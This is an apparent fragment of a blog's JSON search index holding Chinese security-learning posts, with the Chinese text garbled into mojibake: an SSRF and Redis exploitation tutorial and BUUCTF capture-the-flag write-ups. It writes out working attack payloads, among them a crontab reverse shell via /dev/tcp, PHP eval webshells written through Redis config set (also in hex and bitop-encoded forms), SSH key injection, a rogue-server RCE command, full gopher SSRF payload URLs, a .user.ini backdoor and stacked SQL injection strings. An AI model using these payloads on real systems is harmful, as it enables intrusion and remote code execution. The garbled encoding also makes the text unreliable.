notè¿˜åŸæ•°æ®ã€‚ 123set x &quot;\\xc3\\xc0\\x8f\\x97\\x8f\\xdf\\x9a\\x89\\x9e\\x93\\xd7\\xdb\\xa0\\xaf\\xb0\\xac\\xab\\xa4\\xdd\\x9e\\x9e\\xdd\\xa2\\xd6\\xc4\\xdf\\xc0\\xc1&quot; //x=&lt;?php eval($_POST[&quot;aa&quot;]); ?&gt;bitop not x xget x","categories":[{"name":"åè®®å­¦ä¹ ","slug":"åè®®å­¦ä¹ ","permalink":"http://yoursite.com/categories/åè®®å­¦ä¹ /"}],"tags":[]},{"title":"SSRF","slug":"SSRFå­¦ä¹ ","date":"2019-09-27T16:00:00.000Z","updated":"2020-11-21T13:15:44.634Z","comments":true,"path":"2019/09/28/SSRFå­¦ä¹ /","link":"","permalink":"http://yoursite.com/2019/09/28/SSRFå­¦ä¹ /","excerpt":"","text":"SSRFå­¦ä¹ URLç»“æ„urlä¸ºç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚ urlæ ‡å‡†æ ¼å¼å¦‚ä¸‹ï¼š 1[åè®®ç±»å‹]://[æœåŠ¡å™¨åœ°å€]:[ç«¯å£å·]/[èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„][æ–‡ä»¶å]?[æŸ¥è¯¢]#[ç‰‡æ®µID urlå®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š 1[åè®®ç±»å‹]://[è®¿é—®èµ„æºéœ€è¦çš„å‡­è¯ä¿¡æ¯]@[æœåŠ¡å™¨åœ°å€]:[ç«¯å£å·]/[èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„][æ–‡ä»¶å]?[æŸ¥è¯¢]#[ç‰‡æ®µID] åè®®ç±»å‹ï¼šä¸€èˆ¬å«æœ‰http,https,file,ftp,gopher,wais,news,telent å‡­è¯ä¿¡æ¯ï¼šusername:passwordï¼Œä»¥@ç»“å°¾ Curlä¸ParseUrlè§£æurlåŒºåˆ«blackhat2017ä¸­æåˆ°äº†Curlä¸ParseUrlè§£æurlçš„åŒºåˆ«ï¼Œè¦æ±‚Curlç‰ˆæœ¬&lt;=7.54.0ã€‚ ç»è¿‡æœ¬åœ°7.55.1æµ‹è¯•ï¼Œcurlåœ¨portåä¸å…è®¸æœ‰ç©ºæ ¼å‡ºç°Port number ended with &#39; &#39;ï¼Œå‡†ç¡®æ¥è¯´ï¼Œportååªå…è®¸/ã€‚ æœ¬åœ°å¤ç°ä¸€ä¸‹ï¼Œæˆ‘åœ¨æœåŠ¡å™¨ä¸­æ”¾ç½®äº†1.txtï¼Œä¸‹é¢è°ˆè°ˆæˆ‘çš„å‘ç°ã€‚ curlä¼šå°†ç©ºæ ¼åçš„å†…å®¹çœ‹æˆä¸€ä¸ªç›®å½•æ¯”å¦‚ä¸‹é¢ä»£ç ä¸­çš„URLå°±è§£ææˆ/ @www.baidu.com/../1.txtç»è¿‡apacheè§£ææˆ/1.txt ç»è¿‡æŠ“åŒ…å‘ç°è¯·æ±‚å¤´ä¸­çš„Hostä¸ºip:port @www.baidu.comï¼Œåº”è¯¥æ˜¯apacheå°†hostç©ºæ ¼ä¹‹åçš„å†…å®¹æˆªæ–­äº†ã€‚ 123456789101112131415&lt;?php$url=\"http://u:p@ip:port @www.baidu.com/../1.txt\"; var_dump(parse_url($url)); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //æ‰§è¡Œå¹¶è·å–HTMLæ–‡æ¡£å†…å®¹ $output = curl_exec($ch); //é‡Šæ”¾curlå¥æŸ„var_dump( curl_error($ch) );var_dump($output); curl_close($ch);?&gt; htmlæˆåŠŸè¿”å›1.txtçš„å†…å®¹ï¼Œè€Œä¸”parse_urlè§£æçš„hostä¸ºwww.baidu.comã€‚ 12345678array (size=5) 'scheme' =&gt; string 'http' (length=4) 'host' =&gt; string 'www.baidu.com' (length=13) 'user' =&gt; string 'u' (length=1) 'pass' =&gt; string 'p@ip:port ' (length=17) 'path' =&gt; string '/../1.txt' (length=9)D:\\phpstudy_pro\\WWW\\test\\1.php:12:string '' (length=0)D:\\phpstudy_pro\\WWW\\test\\1.php:13:string 'ssrf success! DNSRebindingDNSæœåŠ¡å™¨ç”¨æ¥å°†åŸŸåè§£æåˆ°æ­£ç¡®çš„IPåœ°å€ï¼ŒDNS TTL(Time To Live)ä¸ºIPåœ°å€åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´ã€‚ é€šå¸¸ï¼Œä¸ºäº†åŠ å¿«è§£ææ—¶é—´ï¼Œå½“DNSæœåŠ¡å™¨æ¥æ”¶åˆ°è§£æè¯·æ±‚æ—¶ï¼Œä¼šå°†è§£æç»“æœå­˜åœ¨ç¼“å­˜ä¸­ï¼Œå¦‚æœåœ¨TTLæ—¶é—´å†…åœ¨æ­¤æ¥æ”¶åˆ°æ­¤åŸŸåçš„è§£æè¯·æ±‚ï¼Œç›´æ¥åœ¨ç¼“å­˜ä¸­è¿”å›ç»“æœã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶æ¶æ„DNSæœåŠ¡å™¨ï¼Œè®¾ç½®ä¸€ä¸ªç›¸å½“ä½çš„TTLæ—¶é—´ï¼Œä¸æ–­å˜æ¢IPåœ°å€ä»¥é€ æˆDNSRebindingæ”»å‡»ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥è®¿é—®å†…ç½‘IPåœ°å€ã€‚ è¿™æ˜¯ä¸€ä¸ªå·¥å…·,è¯¥å·¥å…·èƒ½å¤Ÿç”Ÿæˆä¸€ä¸ªåŸŸåï¼Œèƒ½å¤ŸæŒ‡å®šä¸¤ä¸ªIPåœ°å€ï¼Œè¯¥å·¥å…·ä¼šå°†è¯¥åŸŸååœ¨è¿™ä¸¤ä¸ªåœ°å€é—´éšæœºåˆ‡æ¢ã€‚ Redisæ¼æ´åˆ©ç”¨åœ¨ä»‹ç»æ¼æ´åˆ©ç”¨ä¹‹å‰ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹Redisçš„æ•°æ®ä¼ è¾“åè®®ã€‚ Redisæ•°æ®ä¼ è¾“åè®®Redisä½¿ç”¨RESPåºåˆ—åŒ–åè®®å°†ä¼ è¾“çš„æ•°æ®åˆ†ä¸ºä»¥ä¸‹äº”ç§æœ€å°å•å…ƒç±»å‹ï¼Œå•å…ƒç»“æŸæ—¶åŠ ä¸Š\\r\\næ¢è¡Œç¬¦ï¼š å•è¡Œå›å¤ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ+â€ é”™è¯¯ä¿¡æ¯ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ-â€œ æ•´å½¢æ•°å­—ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ:â€ å¤šè¡Œå­—ç¬¦ä¸²ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ$â€ æ•°ç»„ï¼šå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ â€œ*â€ ä»»æ„æ–‡ä»¶å†™å…¥ç”±äºRedisçš„å¤‡ä»½åŠŸèƒ½å¯ä»¥ä»»æ„æŒ‡å®šç›®å½•ï¼Œè¿™å°±é€ æˆäº†ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œä¸»è¦æœ‰åå¼¹shellã€å†™WebShellã€å†™sshå…¬é’¥è¿™å‡ ç§æ”»å‡»æ–¹å¼ã€‚ å¼¹shellåˆ©ç”¨æ–¹å¼é¦–å…ˆè®²ä¸€ä¸‹Linuxçš„å®šæ—¶ä»»åŠ¡ï¼Œåœ¨Linuxä¸­corntabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„ä»»åŠ¡ï¼Œcrontabå‘½ä»¤ä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æŒ‡ä»¤ï¼Œå¹¶å­˜æ”¾äºcrontabæ–‡ä»¶ä¸­ï¼Œä»¥ä¾›ä¹‹åçš„è¯»å–å’Œæ‰§è¡Œã€‚ crontabå‘½ä»¤è¯»å–ç›®å½• 12/var/spool/cron//etc/crontab crontabæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ 1234567minute hour day month week commandæ“ä½œç¬¦æœ‰* å–å€¼èŒƒå›´å†…æ‰€æœ‰æ•°å­—/ æ¯éš”å¤šä¹…æ‰§è¡Œä¸€æ¬¡x-z ä»x-zxï¼Œz æ¯xå’Œzæ‰§è¡Œä¸€æ¬¡* * * * * ä»£è¡¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ æˆ‘ä»¬åˆ©ç”¨Redisçš„å¤‡ä»½åŠŸèƒ½ï¼Œåœ¨crontabè¯»å–å‘½ä»¤çš„ç›®å½•ä¸­ï¼Œå†™å…¥shellï¼Œå³å¯æ‰§è¡Œshellå‘½ä»¤ã€‚ 1234set x \"* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"config set dir /var/spool/cron/config set dbfilename rootsave åˆ©ç”¨æ¡ä»¶ å¼¹shellè¦æ±‚Redisåœ¨rootç”¨æˆ·ä¸‹è¿è¡Œ ç”±äºRediså¤‡ä»½çš„æ˜¯Redisæ ¼å¼çš„æ•°æ®ï¼Œæ‰€ä»¥ä¼šåŒ…å«è®¸å¤šä¹±ç ï¼Œåœ¨Ubuntuä¸‹ä¸èƒ½æ‰§è¡Œï¼ˆCentosä¼šè‡ªåŠ¨å¿½ç•¥é”™è¯¯ä¿¡æ¯ï¼‰ã€‚ å†™å…¥WebShell1234set x &quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;config set dir /Webç›®å½•config set dbfilename &quot;shell.php&quot;save åˆ©ç”¨æ¡ä»¶ Webç›®å½•å†™å…¥æƒé™ å†™å…¥sshå…¬é’¥12345678æœ¬åœ°ç”Ÿæˆå¯†é’¥å¯¹ssh-keygen -t rsa##å°†å…¬é’¥å†™å…¥æœåŠ¡å™¨/root/.sshæ–‡ä»¶å¤¹ä¸­set x &quot;å…¬é’¥&quot;config set dir /root/.sshconfig set dbfilename &quot;authorized_keys&quot;save æ”»å‡»è€…æ‰§è¡Œ 1ssh -i ç§é’¥ root@ip åˆ©ç”¨æ¡ä»¶ rootæƒé™ ä¸»ä»å¤åˆ¶RCEè™½ç„¶redisè¯»å–å†™å…¥çš„é€Ÿåº¦å¾ˆå¿«ï¼Œå½“å¤§é‡çš„è®¿é—®æ•°æ®åº“çš„æ—¶å€™ï¼Œä¸ºäº†åˆ†æ‹…å‹åŠ›ï¼ŒRediæ”¯æŒä¸»ä»å¤åˆ¶åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯»å†™åˆ†ç¦»ï¼ŒèŠ‚ç‚¹å¤åˆ¶ä¸»èŠ‚ç‚¹å…¨éƒ¨æ•°æ®(æ•°æ®å¤åˆ¶åªèƒ½ç”±ä¸»èŠ‚ç‚¹å¤åˆ¶åˆ°ä»èŠ‚ç‚¹)ï¼Œç”±ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼Œå¯å¤§å¤§æé«˜RedisæœåŠ¡å™¨çš„å¹¶å‘é‡ã€‚ æ¼æ´åˆ©ç”¨åŸç†å¯æ‰©å±•moduleä¸ºäº†ä½¿Redisçš„ä½¿ç”¨æ›´åŠ çš„çµæ´»ï¼ŒRedus4.0ä»¥ä¸Šç‰ˆæœ¬æ”¯æŒäº†å¯æ‰©å±•çš„moduleï¼Œå¹¶ç»™å‡ºäº†APIæ–‡ä»¶å’Œå®˜æ–¹ç¤ºä¾‹ã€‚ ç”¨æˆ·åªéœ€æŒ‰ç…§APIç¼–å†™è‡ªå·±çš„moduleï¼Œå¹¶ä½¿ç”¨module load module.soå‘½ä»¤åŠ è½½æ¨¡ç»„ï¼Œå³å¯å¾€RedisæœåŠ¡å™¨ä¸­æ·»åŠ è‡ªå·±çš„å‘½ä»¤ï¼Œéå¸¸çš„æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿèƒ½è‡ªå®šä¹‰å‡½æ•°å®ŒæˆRCEã€‚ è¿™é‡Œä½¿ç”¨githubä¸Šå¤§ä½¬çš„EXPRedis-rouge-serverï¼Œè¯¥EXPç¼–å†™äº†ä¸€ä¸ªsystem.execå‘½ä»¤ï¼ŒåŠ è½½moduleåèƒ½ç›´æ¥è¿›è¡ŒRCEã€‚ ä½†æ˜¯è¿™åªæ˜¯åœ¨è‡ªå·±çš„RedisæœåŠ¡å™¨ä¸Šå®ç°äº†RCEï¼Œå¦‚ä½•å°†ä»–ä¼ å…¥å…¶ä»–çš„RedisæœåŠ¡å™¨å‘¢ï¼Ÿä¸»ä»å¤åˆ¶æ˜¯ä¸ä¼šå°†moduleä¹Ÿå¤åˆ¶ç»™ä»èŠ‚ç‚¹çš„ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°ä¸‹é¢çš„ä¸»ä»å¤åˆ¶å…¨é‡åŒæ­¥ã€‚ ä¸»ä»å¤åˆ¶çš„å…¨é‡åŒæ­¥masteræœåŠ¡å™¨ä¼šå¼€å¯ä¸€ä¸ªåå°è¿›ç¨‹ç”¨äºå°†redisä¸­çš„æ•°æ®ç”Ÿæˆä¸€ä¸ªrdbæ–‡ä»¶ï¼Œä¸æ­¤åŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šç¼“å­˜æ‰€æœ‰æ¥æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·ç«¯çš„å†™å‘½ä»¤ï¼ˆåŒ…å«å¢ã€åˆ ã€æ”¹ï¼‰ï¼Œå½“åå°ä¿å­˜è¿›ç¨‹å¤„ç†å®Œæ¯•åï¼Œä¼šå°†è¯¥rdbæ–‡ä»¶ä¼ é€’ç»™slaveæœåŠ¡å™¨ï¼Œè€ŒslaveæœåŠ¡å™¨ä¼šå°†rdbæ–‡ä»¶ä¿å­˜åœ¨ç£ç›˜å¹¶é€šè¿‡è¯»å–è¯¥æ–‡ä»¶å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ï¼Œåœ¨æ­¤ä¹‹åmasteræœåŠ¡å™¨ä¼šå°†åœ¨æ­¤æœŸé—´ç¼“å­˜çš„å‘½ä»¤é€šè¿‡redisä¼ è¾“åè®®å‘é€ç»™slaveæœåŠ¡å™¨ï¼Œç„¶åslaveæœåŠ¡å™¨å°†è¿™äº›å‘½ä»¤ä¾æ¬¡ä½œç”¨äºè‡ªå·±æœ¬åœ°çš„æ•°æ®é›†ä¸Šæœ€ç»ˆè¾¾åˆ°æ•°æ®çš„ä¸€è‡´æ€§ã€‚ è¿™é‡Œæœ‰ä¸€ç¯‡åšæ–‡ï¼Œæƒ³æ·±å…¥äº†è§£ä¸»ä»å¤åˆ¶å¯ä»¥çœ‹çœ‹https://www.cnblogs.com/kismetv/p/9236731.html&gt; é€šè¿‡ä¸Šé¢çš„ä¸¤ç‚¹å¯ä»¥çŸ¥é“å½“è¿›è¡Œä¸»ä»å¤åˆ¶çš„å…¨é‡åŒæ­¥æ—¶ï¼Œä¼šä¼ è¾“ä¸€ä¸ªæ–‡ä»¶ç»™slaveæœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œé€šè¿‡Pythonä¼ªé€ ä¸€ä¸ªæ¶æ„RedisæœåŠ¡å™¨æ¶æ„RedisæœåŠ¡å™¨ä¼ªé€ ï¼Œå½“æ”¶åˆ°æœåŠ¡å™¨çš„slaveè¯·æ±‚æ—¶ï¼Œæ¨¡æ‹Ÿå…¨é‡åŒæ­¥çš„è¿‡ç¨‹ï¼Œå°†æˆ‘ä»¬çš„exp.soå‘é€åˆ°slaveæœåŠ¡å™¨ä¸­ï¼Œåœ¨slaveæœåŠ¡å™¨æ‰§è¡Œmodule load exp.soå³å¯å®ç°RCEã€‚ æ¼æ´å¤ç°ä¸€å°RedisæœåŠ¡å™¨ 1docker pull shuogesha/redis5.0.5 ä¼ªé€ æ¶æ„RedisæœåŠ¡å™¨ 1https://github.com/LoRexxar/redis-rogue-server exp 1https://github.com/n0b0dyCN/RedisModules-ExecuteCommand å¯åŠ¨é¶æœºReidsçš„dockerï¼Œå°†exp.soä¸ä¼ªé€ çš„RedisæœåŠ¡å™¨æ”¾å…¥åŒä¸€æ–‡ä»¶å¤¹ æ‰§è¡Œå‘½ä»¤ 1python3 redis-rogue-server.py --rhost ç›®æ ‡IP --rport ç›®æ ‡ç«¯å£ --lhost æ”»å‡»æœºIP æ³¨æ„ï¼šæ”»å‡»æœºä¸ç›®æ ‡æœºå¿…é¡»èƒ½å¤Ÿäº’ç›¸è®¿é—®ã€‚ ç°åœ¨æ¶æ„moduleå·²ç»è¢«ç›®æ ‡åŠåŠ è½½ï¼Œè¿æ¥ä¸Šå³å¯æ‰§è¡Œå‘½ä»¤ã€‚ æ¶æ„moduleåŠ è½½RCEä¸»ä»å¤åˆ¶RCEè¦æ±‚æ”»å‡»æœºä¸ç›®æ ‡æœºå¿…é¡»èƒ½å¤Ÿäº’ç›¸è®¿é—®ï¼Œä½†å¦‚æœé¶æœºä¸èƒ½è®¿é—®å¤–ç½‘ä¸»ä»å¤åˆ¶å°±æ‰“ä¸é€šï¼Œé‚£èƒ½ä¸èƒ½åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ¶æ„moduleå‘¢ï¼Œç­”æ¡ˆæ˜¯ä¸èƒ½ï¼Œä¹‹å‰è¯´è¿‡ï¼Œå¤‡ä»½å­˜å…¥çš„æ–‡ä»¶æ˜¯ä»¥Redisçš„ç‰¹æ®Šç»“æ„ä¿å­˜ï¼Œåœ¨ELFæ–‡ä»¶çœ‹æ¥å°±æ˜¯ä¹±ç ï¼Œå› ä¸ºELFæ–‡ä»¶å¯¹æ ¼å¼è¦æ±‚ä¸¥æ ¼ï¼Œæ‰€ä»¥ä¸èƒ½æ‰§è¡Œã€‚ æ‰€ä»¥åªèƒ½é…åˆWebé¡µé¢çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ¶æ„moduleï¼Œç„¶åå†åŠ è½½moduleå®ç°RCEã€‚ gopheråè®®gopheråè®®æ ¼å¼ï¼š 1gopher://ip:port/è¿æ¥ç¬¦+TCP/IPæ•°æ® gopherä¼šå°†è¿æ¥ç¬¦åé¢çš„æ•°æ®å‘é€ç»™ç›¸åº”çš„ç«¯å£ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–æ ¼å¼çš„è¯·æ±‚åŒ…ï¼Œæ¯”å¦‚GET,POST,redis,mysqlæœªæˆæƒè®¿é—®ï¼Œå°†æ•°æ®ä½¿ç”¨urlç¼–ç ï¼Œgopheræ‰èƒ½æ­£å¸¸è§£æã€‚ dictåè®®dictåè®®æ ¼å¼: 12dict://ip:port/å‘½ä»¤:å‚æ•°:å‚æ•°dict://ip:port/å‘½ä»¤ å‚æ•° å‚æ•° dictåè®®æ˜¯è¯å…¸ç½‘ç»œåè®®ï¼Œå¯ä»¥è¿æ¥å­—å…¸æœåŠ¡å™¨ï¼ˆæ¯”å¦‚Redisï¼‰ï¼Œä¸è¿‡åªæ”¯æŒæ²¡æœ‰å¯†ç çš„Redisï¼Œå› ä¸ºdictåªèƒ½é€è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯æ‰§è¡Œä¸€è¡Œåï¼Œéƒ½ä¼šQUITæ–­å¼€è¿æ¥ï¼Œæ‰€ä»¥æ— æ³•ä¿å­˜èº«ä»½è®¤è¯ä¿¡æ¯ã€‚ SSRF+Redisåˆ©ç”¨é€”å¾„gopherå‘é€Redisæ•°æ®åŒ…é¦–å…ˆéœ€è¦çŸ¥é“Redisæ•°æ®åŒ…çš„æ ¼å¼ï¼Œgopheræ‰èƒ½æ­£ç¡®è§£æã€‚ ä½¿ç”¨socatç«¯å£è½¬å‘è·å–Redisæµé‡ï¼š 1socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379 å°†æ¥è‡ª2333ç«¯å£çš„æµé‡è½¬å‘è‡³6379ç«¯å£(ä¹Ÿå°±æ˜¯RedisæœåŠ¡å™¨ç«¯å£)ï¼Œ-vå‚æ•°èƒ½å¤Ÿæ˜¾ç¤ºè½¬å‘çš„æµé‡ã€‚ ä½¿ç”¨redis-cliè¿æ¥2333ç«¯å£ 1./redis-cli -h 127.0.0.1 -p 2333 æ‰§è¡Œset x 1å‘½ä»¤å¯ä»¥çœ‹åˆ°è½¬å‘çš„æµé‡ä¸ºï¼Œè¿™æ˜¯ç»è¿‡RESPåè®®åºåˆ—åŒ–åçš„æ•°æ® 1234567*3\\r$3\\rset\\r$1\\rx\\r$1\\r1\\r æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†payloadè½¬æ¢æˆå¦‚ä¸Šå½¢å¼ï¼Œç„¶åurlç¼–ç ï¼Œä½¿ç”¨gopherå‘é€å³å¯ï¼Œå‰äººæ ½æ ‘ï¼Œåäººä¹˜å‡‰ï¼Œgithubä¸Šæœ‰è®¸å¤šç”Ÿæˆpayloadè„šæœ¬https://github.com/xmsec/redis-ssrf (å¦‚æœæ˜¯getæ–¹å¼ä¼ å‚ï¼Œéœ€è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç ) dicté€è¡Œæ‰§è¡Œå‘½ä»¤é¦–å…ˆå°è¯•ç›´æ¥å‘é€payload 1dict://ip:port/set:x:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot; æŠ¥é”™ï¼ŒæŠ“å–ä¸€ä¸‹æµé‡å‘ç°åœ¨?å¤„è¢«æˆªæ–­ã€‚ 16è¿›åˆ¶ç¼–ç ç»•è¿‡æˆªæ–­å¯¹äº&lt;?è¿™æ ·çš„éæ³•å­—ç¬¦ï¼Œéœ€è¦ç”¨16è¿›åˆ¶ç¼–ç ï¼Œæ­£å¸¸å‘é€ã€‚ 1set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot; æˆåŠŸå†™å…¥ 123set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot;config set dir /var/www/htmlconfig set dbfilename &quot;shell.php&quot; bitopå‘½ä»¤ç»•è¿‡æˆªæ–­Bitopå‘½ä»¤ä¸ºRedisä½æ“ä½œï¼ŒBITOPå‘½ä»¤æ”¯æŒå››ä¸ªä½è¿ç®—ï¼šANDï¼ŒORï¼ŒXOR å’ŒNOT 1234BITOP AND destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘å¹¶ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP OR destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘æˆ–ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP XOR destkey key [key ...] ï¼Œå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªkeyæ±‚é€»è¾‘å¼‚æˆ–ï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkeyBITOP NOT destkey key ï¼Œå¯¹ç»™å®škeyæ±‚é€»è¾‘éï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°destkey æ‰€ä»¥å¯ä»¥å°†payloadå–åï¼Œç„¶åç”¨bitop notè¿˜åŸæ•°æ®ã€‚ 123set x &quot;\\xc3\\xc0\\x8f\\x97\\x8f\\xdf\\x9a\\x89\\x9e\\x93\\xd7\\xdb\\xa0\\xaf\\xb0\\xac\\xab\\xa4\\xdd\\x9e\\x9e\\xdd\\xa2\\xd6\\xc4\\xdf\\xc0\\xc1&quot; //x=&lt;?php eval($_POST[&quot;aa&quot;]); ?&gt;bitop not x xget x url=http://root@127.0.0.1:5000@baidu.com/%3furl=http%3A//127.0.0.1%3A6379/%2520HTTP/1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252441%250D%250A%250A%250Ayezaizheli%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25247%250D%250Amy2.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A url=http://root@127.0.0.1:5000@baidu.com/%3furl=http%3A//127.0.0.1%3A6379/%2520HTTP/1.1%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2fflag%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A","categories":[{"name":"åè®®å­¦ä¹ ","slug":"åè®®å­¦ä¹ ","permalink":"http://yoursite.com/categories/åè®®å­¦ä¹ /"}],"tags":[]},{"title":"BUUCTF","slug":"BUUCTF","date":"2019-09-09T16:00:00.000Z","updated":"2020-10-02T04:55:46.673Z","comments":true,"path":"2019/09/10/BUUCTF/","link":"","permalink":"http://yoursite.com/2019/09/10/BUUCTF/","excerpt":"","text":"checkinâ€‹ æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œé¦–å…ˆæŠ“åŒ…åˆ†æä¸€æ³¢ï¼Œå‘ç°&lt;?,php,ç­‰éƒ½ä¸è¡Œï¼Œç›´æ¥ä¸Šä¼ åŸºæœ¬å‡‰å‡‰ï¼Œäºæ˜¯è€ƒè™‘è§£ææ¼æ´ã€‚ â€‹ å‘ç°é¢˜ç›®æœåŠ¡ç«¯æ˜¯nginxï¼Œhtaccessä¹Ÿä¸è¡Œï¼Œåœ¨ç½‘ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªå§¿åŠ¿ï¼Œuser.iniæ„å»ºåé—¨ åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ç”¨è¿™ä¸ªå§¿åŠ¿çš„æ¡ä»¶ â€‹ 1.ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ã€‚ â€‹ 2.æœåŠ¡å™¨ä½¿ç”¨CGI/FastCGIæ¨¡å¼ â€‹ 3.phpç‰ˆæœ¬è¦åœ¨5.3.0å â€‹ åˆ›å»ºuser.iniå†™å…¥ 12GIF89a auto_prepend_file=test.jpg â€‹ äºæ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬,åä¸ºtest.jpg &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;aa&#39;]);&lt;/script&gt; â€‹ è¿™æ ·æˆ‘ä»¬çš„æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åˆ°åŒç›®å½•ä¸­çš„é‚£ä¸ªindex.phpä¸­äº†ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œå°±ä¸è¯´äº†ã€‚ easy_tornadoâ€‹ è¿™é“é¢˜ç®—æ˜¯æˆ‘åšè¿‡çš„ç¬¬ä¸€é“sstié¢˜ç›®ï¼Œé¦–å…ˆå‘ç°æç¤ºä¸­çš„renderå¯ä»¥çŸ¥é“è¯¥é¢˜ä½¿ç”¨tornadoæ¨¡æ¿å†™çš„ï¼Œå‚è€ƒwriteupï¼Œå‘ç°tornadoçš„é…ç½®å¯ä»¥æ”¾åœ¨handler.settingsä¸­äºæ˜¯å¾—åˆ°payload: å¾—åˆ°secret_cookieã€‚ éšä¾¿æ³¨â€‹ éšä¾¿æ³¨äº†ä¸€ä¸‹å‘ç°åŸºæœ¬éƒ½è¢«è¿‡æ»¤äº†T_T! â€‹ çœ‹äº†ç½‘ä¸Šçš„wpï¼Œå‘ç°è¿™æ˜¯ä¸€é“å †å æ³¨å…¥ã€‚emmmï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼Œè®°å½•ä¸€ä¸‹ç½‘ä¸Šçš„å„ç§payload æ–¹æ³•1ï¼šå­˜å‚¨è¿‡ç¨‹ç»•è¿‡ â€‹ 1.æŠŠå…³é”®å­—ç¼–ç¨‹å“ˆå¸Œå€¼ç»•è¿‡ payload: 11%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql; â€‹ 2.ä½¿ç”¨concatè¿æ¥å…³é”®å­— payload: 1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE 